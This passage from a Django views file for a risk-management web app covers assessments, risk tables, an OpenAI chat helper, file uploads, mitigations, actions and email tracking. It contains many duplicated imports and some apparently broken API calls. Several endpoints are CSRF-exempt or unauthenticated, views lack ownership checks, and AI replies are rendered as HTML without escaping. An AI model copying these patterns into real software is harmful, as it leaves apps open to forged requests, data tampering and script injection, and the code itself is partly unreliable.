    return JsonResponse({"success": False, "error": "Invalid request method."}, status=405)

@login_required
def remove_risk_from_assessment(request, assessment_id):
    """Removes a risk from the assessment."""
    if request.method == "POST":
        assessment = get_object_or_404(RiskAssessment, id=assessment_id)
        data = json.loads(request.body)
        risk_id = data.get("risk_id")

        try:
            risk = Risk.objects.get(id=risk_id)
            assessment.risks.remove(risk)
            return JsonResponse({"success": True, "risk": {"id": risk.id, "title": risk.title}})
        except Risk.DoesNotExist:
            return JsonResponse({"success": False, "error": "Risk not found."}, status=404)

    return JsonResponse({"success": False, "error": "Invalid request method."}, status=405)

@login_required
def mark_risk_assessment_completed_view(request, assessment_id):
    """Marks an assessment as completed."""
    assessment = get_object_or_404(RiskAssessment, id=assessment_id)

    if request.method == "POST":
        # Check if the current user has the permission to mark as completed
        user_profile = request.user.userprofile
        if request.user.is_superuser or user_profile == assessment.assessor:
            # Mark as completed
            assessment.mark_assessed()
            return JsonResponse({"success": True})
        else:
            return JsonResponse({"success": False, "error": "Permission denied."}, status=403)

    return JsonResponse({"success": False, "error": "Invalid request method."}, status=405)

from django.shortcuts import get_object_or_404
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.contrib.auth.decorators import login_required
import json

@login_required
@csrf_exempt
def save_assessment_view(request, assessment_id):
    """Saves changes to the assessment's fields."""
    if request.method == 'POST':
        assessment = get_object_or_404(RiskAssessment, id=assessment_id)
        try:
            data = json.loads(request.body)

            # Extract fields from the request
            title = data.get('title', '').strip()
            description = data.get('description', '').strip()
            created_by_id = data.get('created_by')
            assessor_id = data.get('assessor')
            status = data.get('status')

            # Validate fields
            if not all([title, description, created_by_id, assessor_id, status]):
                return JsonResponse({'success': False, 'error': 'All fields are required.'}, status=400)

            # Update the assessment fields
            assessment.title = title
            assessment.description = description
            assessment.created_by_id = created_by_id
            assessment.assessor_id = assessor_id
            assessment.status = status
            assessment.save()

            return JsonResponse({'success': True})
        except Exception as e:
            return JsonResponse({'success': False, 'error': str(e)}, status=500)

    return JsonResponse({'success': False, 'error': 'Invalid request method.'}, status=405)


@login_required
def risk_assessment_detail_view(request, assessment_id=None):
    """Handles both creating a new risk assessment and editing an existing one."""
    if assessment_id:
        assessment = get_object_or_404(RiskAssessment, id=assessment_id)
    else:
        assessment = RiskAssessment(created_by=request.user.userprofile)

    if request.method == "POST":
        data = json.loads(request.body)
        assessment.title = data.get("title", assessment.title)
        assessment.description = data.get("description", assessment.description)
        assessment.assessor_id = data.get("assessor", assessment.assessor_id)
        assessment.status = data.get("status", assessment.status)

        # Save the assessment
        assessment.save()
        return JsonResponse({"success": True, "assessment_id": assessment.id})

    # Fetch all user profiles for dropdowns
    user_profiles = UserProfile.objects.all()

    return render(request, "risk_assessment_detail.html", {
        "assessment": assessment,
        "user_profiles": user_profiles,
        "all_risks": Risk.objects.exclude(id__in=assessment.risks.values_list("id", flat=True)),
    })






from django.utils.html import escape

def get_risk_level(score):
    if score > 12:
        return "High", "#FFCCCC"  # Red
    elif score > 6:
        return "Medium", "#FFFF99"  # orange
    else:
        return "Low", "#CCFFCC"  # Green

from django.utils.html import strip_tags
from django.db.models import Q

from django.utils.html import strip_tags
from django.db.models import Q

def get_risk_level_color(score):
    if score > 12:
        return "High", "#FFCCCC"  # Light Red
    elif score > 6:
        return "Medium", "#FFFF99"  # Light orange
    else:
        return "Low", "#CCFFCC"  # Light Green
from django.utils.html import strip_tags
from django.db.models import Q

from django.utils.html import strip_tags
from django.db.models import Q

def get_risk_level_color(score):
    """
    Returns the risk level and its associated color.
    """
    if score > 12:
        return "High", "#FFCCCC"  # Light Red
    elif score > 6:
        return "Medium", "#FFFF99"  # Light orange
    else:
        return "Low", "#CCFFCC"  # Light Green

from django.contrib.auth.decorators import login_required
from django.db.models import Q
from django.utils.html import strip_tags
from django.shortcuts import render

@login_required
def residual_risk_table_view(request):
    """
    View to display a sortable table for residual risks, filtered by the user's accessible portfolios.
    """
    # Get the user's profile and accessible portfolios
    user_profile = request.user.userprofile
    user_portfolios = user_profile.portfolios.all()

    # Exclude portfolios based on conditions and filter risks by user's portfolios
    all_risks = Risk.objects.filter(
        portfolio__in=user_portfolios
    ).exclude(
        Q(portfolio__name__istartswith="sub") |
        Q(portfolio__name__istartswith="set") |
        Q(portfolio__name__iexact="archive")
    ).select_related('portfolio')

    pivot_data = []
    for risk in all_risks:
        residual_score = (risk.residual_likelihood or 0) * (risk.residual_impact or 0)
        inherent_score = (risk.inherent_likelihood or 0) * (risk.inherent_impact or 0)
        targeted_score = (risk.targeted_likelihood or 0) * (risk.targeted_impact or 0)

        # Get risk levels and colors
        inherent_level, inherent_color = get_risk_level_color(inherent_score)
        residual_level, residual_color = get_risk_level_color(residual_score)
        targeted_level, targeted_color = get_risk_level_color(targeted_score)

        # Strip HTML tags from the title
        clean_title = strip_tags(risk.title)
        portfolio_name = risk.portfolio.name if risk.portfolio else "Uncategorized"

        pivot_data.append({
            'id': risk.id,
            'title': clean_title,
            'portfolio': portfolio_name,
            'inherent_score': f"{risk.inherent_likelihood or 0} x {risk.inherent_impact or 0} = {inherent_score}",
            'residual_score': f"{risk.residual_likelihood or 0} x {risk.residual_impact or 0} = {residual_score}",
            'targeted_score': f"{risk.targeted_likelihood or 0} x {risk.targeted_impact or 0} = {targeted_score}",
            'inherent_level': inherent_level,
            'residual_level': residual_level,
            'targeted_level': targeted_level,
            'inherent_color': inherent_color,
            'residual_color': residual_color,
            'targeted_color': targeted_color,
            'residual_score_numeric': residual_score,  # For sorting
        })

    # Sort risks descending by residual score
    pivot_data = sorted(pivot_data, key=lambda x: x['residual_score_numeric'], reverse=True)

    context = {
        'pivot_data': pivot_data
    }
    return render(request, 'residual_risk_table.html', context)



@login_required
def residual_risk_table_view_portfolio(request):
    """
    View to display a sortable table for residual risks, filtered by the user's accessible portfolios.
    """
    # Get the user's profile and accessible portfolios
    user_profile = request.user.userprofile
    user_portfolios = user_profile.portfolios.all()

    # Exclude portfolios based on conditions and filter risks by user's portfolios
    all_risks = Risk.objects.filter(
        portfolio__in=user_portfolios
    ).exclude(
        Q(portfolio__name__istartswith="sub") |
        Q(portfolio__name__istartswith="set") |
        Q(portfolio__name__iexact="archive")
    ).select_related('portfolio')

    pivot_data = []
    for risk in all_risks:
        residual_score = (risk.residual_likelihood or 0) * (risk.residual_impact or 0)
        inherent_score = (risk.inherent_likelihood or 0) * (risk.inherent_impact or 0)
        targeted_score = (risk.targeted_likelihood or 0) * (risk.targeted_impact or 0)

        # Get risk levels and colors
        inherent_level, inherent_color = get_risk_level_color(inherent_score)
        residual_level, residual_color = get_risk_level_color(residual_score)
        targeted_level, targeted_color = get_risk_level_color(targeted_score)

        # Strip HTML tags from the title
        clean_title = strip_tags(risk.title)
        portfolio_name = risk.portfolio.name if risk.portfolio else "Uncategorized"

        pivot_data.append({
            'id': risk.id,
            'title': clean_title,
            'portfolio': portfolio_name,
            'inherent_score': f"{risk.inherent_likelihood or 0} x {risk.inherent_impact or 0} = {inherent_score}",
            'residual_score': f"{risk.residual_likelihood or 0} x {risk.residual_impact or 0} = {residual_score}",
            'targeted_score': f"{risk.targeted_likelihood or 0} x {risk.targeted_impact or 0} = {targeted_score}",
            'inherent_level': inherent_level,
            'residual_level': residual_level,
            'targeted_level': targeted_level,
            'inherent_color': inherent_color,
            'residual_color': residual_color,
            'targeted_color': targeted_color,
            'residual_score_numeric': residual_score,  # For sorting
        })

    # Sort risks descending by residual score
    pivot_data = sorted(pivot_data, key=lambda x: x['residual_score_numeric'], reverse=True)

    context = {
        'pivot_data': pivot_data
    }
    return render(request, 'residual_risk_table_portfolio.html', context)

# -------------------------
# Open AI Agent


import openai
import re
import os
import time
import json
from django.conf import settings
from dotenv import load_dotenv
from django.http import JsonResponse
from django.contrib.auth.decorators import login_required
from openai import OpenAI, OpenAIError, RateLimitError

# Load environment variables
env_path = "/home/alexis/projects/ormproject/.env"
load_dotenv(env_path)

# Get API Key
api_key = os.getenv("OPENAI_API_KEY")
if not api_key:
    raise ValueError("❌ ERROR: OPENAI_API_KEY is not set. Please check your .env file.")

# Initialize OpenAI client
client = OpenAI(api_key=api_key)

# Function to handle OpenAI API request with retry mechanism
def fetch_openai_response(messages, max_retries=3, delay=5):
    retries = 0
    while retries < max_retries:
        try:
            # Determine model based on user's message prefix
            user_message = messages[-1]["content"].strip().lower() if messages and messages[-1].get("role") == "user" else ""
            if user_message.startswith("web") or user_message.startswith("search"):
                model = "gpt-4o-search-preview"
            else:
                model = "gpt-3.5-turbo"

            response = client.chat.completions.create(
                model=model,
                messages=messages,
                max_tokens=75,  # Lowered token usage to stay within limits
            )
            return response.choices[0].message.content.strip()

        except RateLimitError as e:
            if retries < max_retries - 1:
                time.sleep(delay)  # Wait before retrying
                delay *= 2  # Exponential backoff
            else:
                return f"⚠️ OpenAI Rate Limit Exceeded: {str(e)}"

        except OpenAIError as e:
            return f"⚠️ OpenAI API Error: {str(e)}"

        except Exception as e:
            return f"⚠️ Unexpected Error: {str(e)}"

        retries += 1

@login_required
def chat_view_o(request):
    if request.method == "POST":
        try:
            data = json.loads(request.body.decode("utf-8"))
            user_message = data.get("message", "").strip()

            if not user_message:
                return JsonResponse({"error": "No message provided."}, status=400)

            # Maintain a limited chat history (last 5 exchanges) to save tokens
            if "messages" not in request.session:
                request.session["messages"] = [{"role": "system", "content": "You are a helpful risk management assistant."}]
            request.session["messages"].append({"role": "user", "content": user_message})
            request.session["messages"] = request.session["messages"][-10:]  # Keep only the last 10 messages

            # Get AI response with retry mechanism
            ai_response = fetch_openai_response(request.session["messages"])

            # Format response for HTML rendering
            formatted_response = ai_response.replace("\n", "<br>")
            formatted_response = re.sub(r"\*\*(.*?)\*\*", r"<strong>\1</strong>", formatted_response)  # Bold text
            formatted_response = re.sub(r"\[([^\]]+)\]\(([^)]+)\)", r'<a href="\2" target="_blank">\1</a>', formatted_response)  # Convert Markdown links

            # Store AI response in session
            request.session["messages"].append({"role": "assistant", "content": formatted_response})
            request.session.modified = True

            return JsonResponse({"response": formatted_response})

        except json.JSONDecodeError:
            return JsonResponse({"error": "Invalid JSON format."}, status=400)

    return JsonResponse({"error": "This endpoint only accepts POST requests."}, status=405)


from django.shortcuts import render

def chat_page_o(request):
    """
    Render the chat interface page.
    """
    return render(request, "chat/ochat.html")



from django.shortcuts import get_object_or_404, redirect
from django.contrib import messages
from orm.models import Risk, Portfolio

from django.shortcuts import get_object_or_404, redirect
from django.contrib import messages
from django.http import JsonResponse
from orm.models import Risk, Portfolio

from django.utils.html import format_html

def replicate_risk(request, risk_id):
    if request.method == "POST":
        selected_portfolio_id = request.POST.get('portfolio')

        # Fetch the selected portfolio, ensuring it belongs to the user's accessible portfolios
        selected_portfolio = get_object_or_404(
            Portfolio,
            id=selected_portfolio_id,
            user_profiles__user=request.user  # Ensure proper related name
        )

        # Fetch the original risk
        original_risk = get_object_or_404(Risk, id=risk_id)

        # Create a dictionary of the original risk's attributes
        original_risk_data = {
            "title": original_risk.title,
            "description": original_risk.description,
            "portfolio": selected_portfolio,
            "approval_cycle": original_risk.approval_cycle,
            "inherent_likelihood": original_risk.inherent_likelihood,
            "inherent_impact": original_risk.inherent_impact,
            "residual_likelihood": original_risk.residual_likelihood,
            "residual_impact": original_risk.residual_impact,
            "targeted_likelihood": original_risk.targeted_likelihood,
            "targeted_impact": original_risk.targeted_impact,
            "treatment_type": original_risk.treatment_type,
            "category": original_risk.category,  # Copy the category
        }

        # Create the replicated risk
        replicated_risk = Risk(**original_risk_data)
        replicated_risk.save()  # Save after assignment

        # Set the current user as an owner
        replicated_risk.owners.add(request.user.userprofile)

        # Replicate related mitigations
        replicated_risk.mitigations.set(original_risk.mitigations.all())

        # Replicate related actions
        for action in original_risk.actions.all():
            new_action = action
            new_action.pk = None  # Clear primary key to create a new object
            new_action.risk = replicated_risk
            new_action.save()

        # Create a success message with a clickable link to the new risk
        risk_url = f"/risk/{replicated_risk.id}/"  # Adjust if necessary
        success_message = format_html(
            "Risk '{}' successfully replicated into portfolio '{}'. <a href='{}' class='alert-link' target='_blank'>View New Risk</a>",
            original_risk.title, selected_portfolio.name, risk_url
        )

        # **🔹 If AJAX request, return JSON instead of redirecting**
        if request.headers.get('x-requested-with') == 'XMLHttpRequest':
            return JsonResponse({
                "success": True, 
                "message": success_message, 
                "new_risk_id": replicated_risk.id
            })

        # **Otherwise, use Django messages (for non-AJAX requests)**
        messages.success(request, success_message)
        return redirect('risk_detail', risk_id=replicated_risk.id)

    # Error case: Invalid request method
    if request.headers.get('x-requested-with') == 'XMLHttpRequest':
        return JsonResponse({"success": False, "message": "Invalid request method."}, status=400)

    messages.error(request, "Invalid request method.")
    return redirect('risk_list')


from django.views.decorators.csrf import csrf_exempt
from django.http import JsonResponse
from django.core.files.storage import default_storage
from django.core.files.base import ContentFile
import os

@csrf_exempt
def upload_file(request):
    if request.method == "POST" and request.FILES.get("file"):
        uploaded_file = request.FILES["file"]
        file_path = os.path.join("uploads", uploaded_file.name)

        # Save file to storage
        file_name = default_storage.save(file_path, ContentFile(uploaded_file.read()))

        # Placeholder for file analysis (replace with AI processing logic)
        response_message = f"📂 File '{uploaded_file.name}' uploaded successfully. Processing..."

        return JsonResponse({"response": response_message})

    return JsonResponse({"error": "No file uploaded"}, status=400)

import openai
import os
import json
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt

# Load OpenAI API Key
openai.api_key = os.getenv("OPENAI_API_KEY")


import openai
import os
import json
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt

# Load OpenAI API Key
openai.api_key = os.getenv("OPENAI_API_KEY")


@csrf_exempt
def upload_file_to_openai(request):
    """
    Uploads a file to OpenAI's File Search API (New API)
    """
    if request.method == "POST" and request.FILES.get("file"):
        uploaded_file = request.FILES["file"]
        
        # Convert file to bytes for API upload
        file_data = uploaded_file.read()
        file_name = uploaded_file.name

        try:
            # Upload file to OpenAI's API
            response = openai.files.create(
                file=(file_name, file_data, "application/octet-stream"),
                purpose="assistants"
            )

            # ✅ Access the file ID correctly
            file_id = response.id  # Fix: Use .id instead of .get("id")

            return JsonResponse({"success": True, "file_id": file_id, "filename": file_name})

        except openai.OpenAIError as e:
            return JsonResponse({"success": False, "error": str(e)})

    return JsonResponse({"success": False, "error": "Invalid request."})

@csrf_exempt
def search_file_on_openai(request):
    """
    Searches within an uploaded file using OpenAI File Search API.
    """
    if request.method == "POST":
        data = json.loads(request.body)
        file_id = data.get("file_id")
        query = data.get("query")

        if not file_id or not query:
            return JsonResponse({"success": False, "error": "Missing file_id or query."})

        try:
            response = openai.beta.responses.create(
                model="gpt-4o",
                messages=[{"role": "user", "content": query}],
                file_search={"tool_choice": "auto", "files": [file_id]},
                max_tokens=250
            )

            answer = response.choices[0].message["content"]

            return JsonResponse({"success": True, "answer": answer})

        except openai.OpenAIError as e:
            return JsonResponse({"success": False, "error": str(e)})

    return JsonResponse({"success": False, "error": "Invalid request."})









# ----------------
# EOF Open AI AGENT

from django.shortcuts import render, get_object_or_404, redirect
from .models import Mitigation

from django.contrib import messages

def update_mitigation(request, mitigation_id):
    mitigation = get_object_or_404(Mitigation, id=mitigation_id)

    if request.method == 'POST':
        # Update the fields with the submitted data
        mitigation.title = request.POST.get('title', mitigation.title)
        mitigation.description = request.POST.get('description', mitigation.description)
        mitigation.effectiveness = request.POST.get('effectiveness', mitigation.effectiveness)
        mitigation.save()

        # Add a success message
        messages.success(request, 'Mitigation details saved successfully.')

        # Redirect back to the mitigation detail page
        return redirect('mitigation_detail', mitigation_id=mitigation.id)

    return render(request, 'mitigation_detail.html', {'mitigation': mitigation})



from django.shortcuts import render, get_object_or_404
from .models import Mitigation

from django.shortcuts import render
from .models import Mitigation

from django.shortcuts import render
from .models import Mitigation  # Assuming your models are in models.py

from django.shortcuts import render
from .models import Mitigation  # Assuming your models are in models.py

from django.shortcuts import render
from .models import Mitigation  # Assuming your models are in models.py

def mitigation_list(request):
    """
    View for displaying a list of mitigations accessible via the user's portfolios.
    """
    if request.user.is_authenticated:
        # Fetch the user's portfolios
        user_portfolios = request.user.userprofile.portfolios.all()

        # Filter mitigations by user's portfolios and prefetch related risks
        mitigations = Mitigation.objects.filter(
            portfolio__in=user_portfolios
        ).prefetch_related('risks').order_by('-updated_at')
    else:
        # Return an empty queryset for unauthenticated users
        mitigations = Mitigation.objects.none()

    return render(request, 'mitigation_list.html', {'mitigations': mitigations})



from django.shortcuts import render, get_object_or_404, redirect
from django.contrib import messages
from .models import Mitigation, Risk

def mitigation_detail(request, mitigation_id):
    """
    View for displaying and updating the details of a specific mitigation,
    including related risks management.
    """
    mitigation = get_object_or_404(Mitigation, id=mitigation_id)
    
    if request.method == 'POST':
        # Update mitigation
        mitigation.title = request.POST.get('title')
        mitigation.description = request.POST.get('description')
        mitigation.effectiveness = request.POST.get('effectiveness')
        mitigation.save()
        
        # Update related risks
        risk_ids = request.POST.getlist('risks')
        mitigation.risks.set(Risk.objects.filter(id__in=risk_ids))
        
        messages.success(request, "Mitigation updated successfully!")
        return redirect('mitigation_detail', mitigation_id=mitigation.id)
    
    # Get all risks for the add dropdown (excluding already linked ones)
    all_risks = Risk.objects.all()
    
    context = {
        'mitigation': mitigation,
        'all_risks': all_risks,
    }
    return render(request, 'mitigation_detail.html', context)
from django.http import HttpResponse
from django.template.loader import render_to_string
# from weasyprint import HTML, CSS
from django.contrib.staticfiles import finders
from io import BytesIO
import zipfile
from django.db.models import Q

def generate_new_report(request):
    # Reference to the logo path in the static folder
    logo_path = finders.find('images/avax-logo.jpeg')
    if not logo_path:
        raise FileNotFoundError('Logo file not found in static/images.')

    # Create a buffer to hold the ZIP data
    buffer = BytesIO()

    with zipfile.ZipFile(buffer, 'w') as zip_archive:
        # Generate the main report PDF
        main_report_html = render_to_string('main_report_template.html', {
            'logo_path': logo_path,
            'executive_summary': "This report provides a comprehensive analysis of risk management activities conducted during the year.",
            'risk_severity_list': get_sample_risks(),  # Replace with real data from the database
        })
        main_pdf = generate_pdf(main_report_html)
        zip_archive.writestr('new_report_ENGLISH.pdf', main_pdf)

        # Generate the annex report PDF
        annex_html = render_to_string('annex_template.html', {
            'logo_path': logo_path,
            'portfolios': get_sample_portfolios(),  # Replace with real data
        })
        annex_pdf = generate_pdf(annex_html)
        zip_archive.writestr('annex_risks_by_portfolio_ENGLISH.pdf', annex_pdf)

    # Set the buffer position to the beginning
    buffer.seek(0)

    # Create the response
    response = HttpResponse(buffer, content_type='application/zip')
    response['Content-Disposition'] = 'attachment; filename="new_report_ENGLISH.zip"'

    return response


def generate_pdf(html_content):
    """Generates a PDF from the given HTML content."""
    pdf_io = BytesIO()
    # HTML(string=html_content).write_pdf(pdf_io)
    pdf_io.seek(0)
    return pdf_io.read()


def get_sample_risks():
    """Returns sample risk data for testing purposes."""
    return [
        {'rank': 1, 'portfolio': 'Portfolio A', 'title': 'Risk Example 1', 'score': 25},
        {'rank': 2, 'portfolio': 'Portfolio B', 'title': 'Risk Example 2', 'score': 20},
        {'rank': 3, 'portfolio': 'Portfolio C', 'title': 'Risk Example 3', 'score': 15},
    ]


def get_sample_portfolios():
    """Returns sample portfolio data for testing purposes."""
    return [
        {'name': 'Portfolio A', 'total_risks': 10},
        {'name': 'Portfolio B', 'total_risks': 15},
        {'name': 'Portfolio C', 'total_risks': 20},
    ]



from django.utils.timezone import now
from django.db.models import Q
from django.views.generic import ListView


from django.shortcuts import get_object_or_404
from django.views.generic.edit import UpdateView
from .models import Action, UserProfile, Portfolio
from django.urls import reverse_lazy

from django.urls import reverse_lazy
from django.views.generic.edit import UpdateView
from .models import Action, UserProfile, Portfolio


from django.views.generic.edit import UpdateView
from django.urls import reverse_lazy
from django.contrib.messages.views import SuccessMessageMixin
from .models import Action, UserProfile, Portfolio



from django.shortcuts import render, get_object_or_404, redirect
from django.utils.timezone import now
from django.contrib.auth.decorators import login_required
from django.db.models import Q
from .models import Action, UserProfile, Portfolio

from collections import defaultdict
from django.contrib.auth.decorators import login_required
from django.shortcuts import render
from django.db.models import Prefetch, Q
from django.utils.timezone import now
from .models import Action, UserProfile

from django.contrib.auth.decorators import login_required
from django.shortcuts import render
from django.utils.timezone import now
from collections import defaultdict
from django.db.models import Q
from .models import Action

from collections import defaultdict
from datetime import date
from django.shortcuts import render
from django.db.models import Q
from django.utils.timezone import now
from .models import Action

from collections import defaultdict
from datetime import date
from django.shortcuts import render
from django.db.models import Q
from django.utils.timezone import now
from .models import Action

from collections import defaultdict
from datetime import date
from django.shortcuts import render
from django.db.models import Q
from django.utils.timezone import now
from .models import Action

from datetime import date
from django.shortcuts import render
from django.db.models import Q
from django.utils.timezone import now
from .models import Action

from django.shortcuts import render
from django.db.models import Q
from django.utils.timezone import now
from collections import defaultdict
from django.contrib.auth.decorators import login_required

from .models import Action

from django.shortcuts import render
from django.db.models import Q
from django.utils.timezone import now
from collections import defaultdict
from django.contrib.auth.decorators import login_required

from .models import Action

@login_required
def action_list_view(request):
    user = request.user
    today = now().date()

    # Gather actions relevant to the current user
    actions = Action.objects.filter(
        Q(owner__user=user) |
        Q(performer__user=user) |
        Q(portfolio__in=user.userprofile.portfolios.all())
    ).prefetch_related("risks", "owner", "performer", "portfolio").order_by('deadline')

    # Calculate countdown days
    for action in actions:
        if action.deadline:
            delta = action.deadline - today
            action.countdown_days = delta.days
            action.countdown_absolute = abs(delta.days)
        else:
            action.countdown_days = None
            action.countdown_absolute = None

    # Separate actions by status/time
    overdue_actions = [
        act for act in actions
        if act.countdown_days is not None and act.countdown_days < 0 and act.status == 'pending'
    ]
    pending_actions = [
        act for act in actions
        if act.countdown_days is not None and act.countdown_days >= 0 and act.status == 'pending'
    ]
    completed_actions = [
        act for act in actions
        if act.status == 'completed'
    ]

    # Sort each category
    overdue_actions.sort(key=lambda x: x.countdown_days)  # ascending
    pending_actions.sort(key=lambda x: x.countdown_days)
    completed_actions.sort(key=lambda x: x.deadline if x.deadline else today)

    # Helper to group by owner
    def group_by_owner(action_list):
        dct = defaultdict(list)
        for a in action_list:
            dct[a.owner].append(a)
        return dict(dct)

    # Build dictionaries of actions grouped by owner
    overdue_actions_by_owner   = group_by_owner(overdue_actions)
    pending_actions_by_owner   = group_by_owner(pending_actions)
    completed_actions_by_owner = group_by_owner(completed_actions)

    # Totals for each category
    overdue_count   = len(overdue_actions)
    pending_count   = len(pending_actions)
    completed_count = len(completed_actions)

    context = {
        # Flattened lists if you want them
        'overdue_actions': overdue_actions,
        'pending_actions': pending_actions,
        'completed_actions': completed_actions,

        # Dictionaries grouped by Owner
        'overdue_actions_by_owner': overdue_actions_by_owner,
        'pending_actions_by_owner': pending_actions_by_owner,
        'completed_actions_by_owner': completed_actions_by_owner,

        # Totals
        'overdue_count': overdue_count,
        'pending_count': pending_count,
        'completed_count': completed_count,

        'today': today,
    }
    return render(request, "actions/action_list.html", context)


from django.shortcuts import render, get_object_or_404, redirect
from django.contrib.auth.decorators import login_required
from .models import Action, UserProfile, Portfolio

from django.shortcuts import get_object_or_404, redirect, render
from django.contrib.auth.decorators import login_required
from .models import Action, Risk, UserProfile, Portfolio

from django.shortcuts import get_object_or_404, redirect, render
from django.contrib.auth.decorators import login_required
from .models import Action, Risk, UserProfile, Portfolio

from django.contrib.auth.decorators import login_required
from django.shortcuts import render, get_object_or_404, redirect
from .models import Action, Portfolio, UserProfile

@login_required
def action_detail_view(request, pk):
    action = get_object_or_404(Action, pk=pk)

    if request.method == 'POST':
        # Update fields based on POST data
        action.title = request.POST.get('title', action.title)
        action.description = request.POST.get('description', action.description)
        action.owner_id = request.POST.get('owner', action.owner_id)
        action.portfolio_id = request.POST.get('portfolio', action.portfolio_id)
        action.performer_id = request.POST.get('performer', action.performer_id)
        action.deadline = request.POST.get('deadline', action.deadline)  # Correctly handle deadline
        action.status = request.POST.get('status', action.status)
        action.save()
        return redirect('action_list')  # Redirect to the list view after saving

    # Fetch related risks
    related_risks = action.risks.all()

    context = {
        'action': action,
        'users': UserProfile.objects.filter(user__is_active=True).order_by('user__username'),
        'portfolios': Portfolio.objects.all().order_by('name'),  # ✅ Sorted Alphabetically A-Z
        'related_risks': related_risks,
    }
    return render(request, 'actions/action_detail.html', context)




class ActionCreateView(CreateView):
    model = Action
    fields = ['title', 'description', 'owner', 'portfolio', 'performer', 'deadline', 'status']
    template_name = 'actions/action_form.html'
    success_url = reverse_lazy('action_list')

class ActionUpdateView(UpdateView):
    model = Action
    fields = ['title', 'description', 'owner', 'portfolio', 'performer', 'deadline', 'status']
    template_name = 'actions/action_form.html'
    success_url = reverse_lazy('action_list')


from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import get_object_or_404
from .models import Risk, Action

@csrf_exempt
def link_action(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        risk = get_object_or_404(Risk, id=data['risk_id'])
        action = get_object_or_404(Action, id=data['action_id'])

        if action.portfolio in request.user.userprofile.portfolios.all():
            risk.actions.add(action)
            return JsonResponse({'success': True})

        return JsonResponse({'success': False, 'error': 'Action not in your portfolio.'})

@csrf_exempt
def unlink_action(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        risk = get_object_or_404(Risk, id=data['risk_id'])
        action = get_object_or_404(Action, id=data['action_id'])

        if action in risk.actions.all():
            risk.actions.remove(action)
            return JsonResponse({'success': True})

        return JsonResponse({'success': False, 'error': 'Action not linked to this risk.'})

def available_actions(request, risk_id):
    risk = get_object_or_404(Risk, id=risk_id)
    actions = Action.objects.filter(portfolio__in=request.user.userprofile.portfolios.all()).exclude(id__in=risk.actions.all())
    return JsonResponse({'actions': [{'id': a.id, 'title': a.title} for a in actions]})



from django.shortcuts import render
from django.contrib.auth.models import User
from orm.models import UserProfile, Portfolio  # Assuming you have these models

from django.shortcuts import render
from django.contrib.auth.decorators import login_required
from django.http import JsonResponse
from .models import User, Portfolio, UserProfile

from django.shortcuts import render
from django.contrib.auth.decorators import login_required
from django.http import JsonResponse
from .models import User, Portfolio, UserProfile

@login_required
def select_recipients_view(request):
    users = User.objects.all().select_related('userprofile')
    portfolios = Portfolio.objects.all()  # Default: Show all portfolios

    return render(request, "select_users.html", {"users": users, "portfolios": portfolios})

from django.http import JsonResponse
from .models import Portfolio, UserProfile

def filter_portfolios_by_user(request):
    user_id = request.GET.get("user_id")
    user_profile = UserProfile.objects.filter(user_id=user_id).first()
    
    if user_profile:
        portfolios = user_profile.portfolios.values("id", "name")
    else:
        portfolios = []

    return JsonResponse({"portfolios": list(portfolios)})

from django.shortcuts import render
from django.contrib.auth.models import User
from django.core.mail import send_mail
from .forms import EmailForm

from django.shortcuts import render, redirect
from django.contrib.auth.models import User
from .forms import EmailForm

from django.shortcuts import get_object_or_404, redirect
from django.utils.timezone import now
from django.contrib import messages

def confirm_response(request):
    email_id = request.GET.get("email")
    email_log = get_object_or_404(EmailLog, id=email_id)

    if not email_log.response_received:
        email_log.response_received = True
        email_log.responded_at = now()
        email_log.save()

    messages.success(request, "Your response has been recorded. Thank you!")
    return redirect("thank_you_page")

from django.shortcuts import render
from .models import EmailLog
from django.contrib.admin.views.decorators import staff_member_required

@staff_member_required
def email_tracking_dashboard(request):
    """
    Admin-only view to display the list of sent emails and track responses.
    """
    emails = EmailLog.objects.all().order_by("-sent_at")
    return render(request, "email_dashboard.html", {"emails": emails})
from django.shortcuts import render, get_object_or_404
from .models import EmailLog

def email_detail_view(request, email_id):
    email = get_object_or_404(EmailLog, id=email_id)
    return render(request, "email_detail.html", {"email": email})

import smtplib
import logging
import base64
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from django.utils.timezone import now
from .models import EmailLog, SMTPSetting
from django.core.exceptions import ObjectDoesNotExist
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from .models import EmailLog

@csrf_exempt
def mark_email_as_responded(request):
    """
    API to mark an email as responded.
    """
    if request.method == "POST":
        email = request.POST.get("email")
        try:
            email_log = EmailLog.objects.get(recipient_email=email)
            email_log.response_received = True
            email_log.responded_at = now()
            email_log.save()
            return JsonResponse({"message": "Response marked successfully."}, status=200)
        except EmailLog.DoesNotExist:
            return JsonResponse({"error": "Email not found."}, status=404)
    
    return JsonResponse({"error": "Invalid request."}, status=400)

import smtplib
import base64
import logging
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from django.utils.timezone import now
from .models import SMTPSetting, EmailLog

import os
import base64
import smtplib
import logging
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from datetime import datetime
from django.conf import settings
from django.templatetags.static import static
from orm.models import SMTPSetting  # Replace 'your_app' with the actual app name


import os
import base64
import smtplib
import logging
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from datetime import datetime
from django.conf import settings


import os
import base64
import smtplib
import logging
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from datetime import datetime
from django.conf import settings


import os
import base64
import smtplib
import logging
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from datetime import datetime
from django.conf import settings
from django.templatetags.static import static


import os
import base64
import smtplib
import logging
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from datetime import datetime
from django.conf import settings
from django.templatetags.static import static  # ✅ Import Django static helper


import os
import base64
import smtplib
import logging
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from datetime import datetime
from django.conf import settings


import os
import base64
import smtplib
import logging
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from datetime import datetime
from django.conf import settings


import os
import base64
import smtplib
import logging
